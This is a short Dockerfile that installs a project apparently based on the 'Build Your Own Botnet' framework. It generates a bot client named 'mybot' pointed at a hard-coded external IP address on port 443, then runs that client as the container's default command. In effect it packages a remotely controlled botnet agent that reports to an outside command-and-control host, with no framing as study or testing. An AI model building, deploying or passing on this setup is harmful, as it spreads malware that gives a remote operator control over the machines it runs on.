FROM python:latest

WORKDIR /usr/src/app
COPY . .

WORKDIR /usr/src/app/byob
RUN pip install --no-cache-dir -r requirements.txt
RUN python ./setup.py
RUN python ./client.py --name mybot 35.239.122.35 443

CMD [ "python", "mybot.py" ]
